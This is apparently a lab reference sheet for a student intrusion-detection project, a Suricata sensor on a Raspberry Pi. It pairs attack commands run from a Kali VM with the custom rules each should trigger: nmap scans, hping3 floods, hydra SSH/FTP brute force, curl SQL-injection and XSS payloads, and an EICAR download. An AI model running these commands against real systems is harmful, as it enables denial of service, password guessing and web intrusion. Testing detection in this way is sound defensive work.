=====================================================================
  NetGuard Pi - Demo Attack Test Commands (Lab reference)
  Authorised FYP lab only. Attacker and target are owned by the team.
  Attacker : Kali Linux VM   192.168.10.20
  Target   : Raspberry Pi 4  192.168.10.50  (Suricata, 18 custom rules)
  Dashboard: http://192.168.10.50:8080
=====================================================================

HOW TO READ THIS FILE
- Run the "Kali command" in the Kali terminal.
- Watch the dashboard: the matching alert should appear in ~2-3 seconds.
- "Rule" = the custom Suricata SID that should fire.

If Kali stops reaching the Pi mid-demo, it was auto-blocked. On the Pi run:
    sudo iptables -F FYP-BLOCK
to clear the block, then continue.

---------------------------------------------------------------------
T1  TCP SYN port scan
    What it is : looks for open TCP ports by sending SYN packets.
    Kali       : nmap -sS 192.168.10.50
    Rule       : 1000001 (+ team rules 9000002-9000004)

T2  Stealth scans (XMAS / NULL / FIN)
    What it is : scans with unusual TCP flags to avoid simple filters.
    Kali       : sudo nmap -sX 192.168.10.50
                 sudo nmap -sN 192.168.10.50
                 sudo nmap -sF 192.168.10.50
    Rule       : 1000002 (XMAS), 1000003 (NULL), 1000004 (FIN)

T3  Aggressive scan + OS / service detection
    What it is : full scan that also fingerprints OS and service versions.
    Kali       : nmap -A 192.168.10.50
    Rule       : 1000001, 9000002-9000004, 1000006 (SSH probe)

T4  ICMP flood (Denial of Service)
    What it is : floods the host with ping (ICMP echo) packets.
    Kali       : sudo timeout 10 hping3 -1 --flood 192.168.10.50
    Rule       : 1000005

T5  SSH brute force
    What it is : repeatedly guesses SSH passwords.
    Prep (Kali): printf "%s\n" pass{1..100} > /tmp/pw.txt
    Kali       : hydra -l testuser -P /tmp/pw.txt -t 4 ssh://192.168.10.50
    Rule       : 1000006   (severity HIGH)

T6  FTP brute force
    What it is : repeatedly guesses FTP passwords (server returns 530).
    Kali       : hydra -l testuser -P /tmp/pw.txt -t 4 ftp://192.168.10.50
    Rule       : 1000007   (severity HIGH)

T7  TCP SYN flood (Denial of Service)
    What it is : floods a port with half-open TCP connections.
    Kali       : sudo timeout 10 hping3 -S -p 80 --flood 192.168.10.50
    Rule       : 1000008

T8  Web attacks (SQL injection and XSS)
    What it is : sends malicious SQLi and XSS payloads in HTTP requests.
    Kali (SQLi): curl "http://192.168.10.50/?id=1 UNION SELECT user,password FROM users"
    Kali (XSS) : curl "http://192.168.10.50/?q=<script>alert(1)</script>"
    (or) scan  : nikto -h http://192.168.10.50
    Rule       : 1000010 (SQLi UNION), 1000013 (SQLi OR 1=1), 1000011 (XSS)

T9  Malware download (EICAR test file)
    What it is : downloads the harmless EICAR anti-virus test string over HTTP.
    Prep (Kali): echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com
                 cd /tmp && python3 -m http.server 8000
    On the Pi  : wget http://192.168.10.20:8000/eicar.com -O /tmp/eicar.com
    Rule       : 1000009
    (EICAR is a standard, non-malicious test file used to check detection.)

=====================================================================
  EXTRA TESTS (cover the remaining rules -> all 18 triggered)
=====================================================================

UDP port scan
    Kali       : sudo nmap -sU --top-ports 20 192.168.10.50
    Rule       : 9000005

Telnet policy violation (needs a real connection to port 23)
    On the Pi  : sudo python3 -c "import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',23));s.listen(1);print('listening');c,a=s.accept();print(a,c.recv(100));c.close();s.close()"
    Kali       : echo hello | nc -w 3 192.168.10.50 23
    Rule       : 1000012

Distributed DoS - spoofed sources (detection only; blocking cannot stop it)
    Kali (ICMP): sudo timeout 10 hping3 -1 --flood --rand-source 192.168.10.50
    Kali (SYN) : sudo timeout 10 hping3 -S -p 80 --flood --rand-source 192.168.10.50
    Rule       : 1000005 (ICMP), 1000008 (SYN)

=====================================================================
  SHOW PREVENTION (IPS / auto-block) - run these on the PI
=====================================================================

See the auto-block happen (after T5 or T6 triggers 5 alerts in 30 s):
    sudo journalctl -u ids-blocker -n 10 --no-pager | grep -E "BLOCKED|UNBLOCKED"
    sudo iptables -L FYP-BLOCK -n

Clear a block during the demo:
    sudo iptables -F FYP-BLOCK

=====================================================================
  USEFUL PI COMMANDS
=====================================================================

Check all services are running:
    systemctl is-active suricata ids-collector ids-dashboard ids-blocker

Check rules loaded (expect: 18 rules, 0 failed):
    sudo suricata -T -c /etc/suricata/suricata.yaml -v 2>&1 | grep "rules successfully"

See the latest alerts in the log:
    sudo tail -n 20 /var/log/suricata/fast.log

Clear the dashboard before the demo (start at 0 alerts):
    sudo systemctl stop ids-collector ids-dashboard ids-blocker
    sudo python3 -c "import sqlite3;c=sqlite3.connect('/var/lib/fyp-ids/alerts.db');c.execute('delete from alerts');c.execute('delete from blocks');c.commit()"
    sudo systemctl start ids-collector ids-dashboard ids-blocker
    sudo iptables -F FYP-BLOCK

=====================================================================
  ALL 18 CUSTOM RULES - REFERENCE
  (13 FYP-IDS rules 1000001-1000013 + 5 team rules 9000001-9000005)
  Note: one attack can trigger several rules - this is intentional
  (defence in depth: different rules watch different behaviours).
=====================================================================

Rule     Name                                 What it looks for
-------  -----------------------------------  ----------------------------------------------
1000001  FYP-IDS SCAN TCP SYN port scan       5+ SYN packets from one source in 3 s (main scan rule)
1000002  FYP-IDS SCAN Nmap XMAS scan          TCP packet with FIN+PSH+URG flags set together (invalid)
1000003  FYP-IDS SCAN Nmap NULL scan          TCP packet with NO flags set (invalid)
1000004  FYP-IDS SCAN Nmap FIN scan           TCP packet with only the FIN flag set (invalid)
1000005  FYP-IDS DOS ICMP flood               high rate of ICMP echo (ping) packets to one host
1000006  FYP-IDS BRUTEFORCE SSH brute force   10+ new SSH connections (port 22) from one source in 60 s
1000007  FYP-IDS BRUTEFORCE FTP brute force   repeated FTP "530 login failed" replies to one source
1000008  FYP-IDS DOS TCP SYN flood            high rate of TCP SYN packets to one host
1000009  FYP-IDS MALWARE EICAR download       the EICAR test-file signature inside an HTTP download
1000010  FYP-IDS WEB SQL injection (UNION)    "UNION SELECT" pattern in an HTTP request
1000011  FYP-IDS WEB Cross-site scripting     "<script>" pattern in an HTTP request (XSS)
1000012  FYP-IDS POLICY Telnet attempt        an established TCP connection to port 23 (Telnet)
1000013  FYP-IDS WEB SQL injection (OR 1=1)   "OR 1=1" pattern in an HTTP request

9000001  NetGuard ICMP ping to lab host       a ping (ICMP echo) to the sensor (1 alert/min per target)
9000002  NMAP SYN Scan Detected               the SYN-scan pattern (SYN flag, no full connection)
9000003  NMAP Port Scan Detected              many ports touched quickly by one source
9000004  NMAP Service Scan Detected           probing multiple services on one host
9000005  NMAP UDP Scan Detected               5+ UDP packets from one source in 3 s
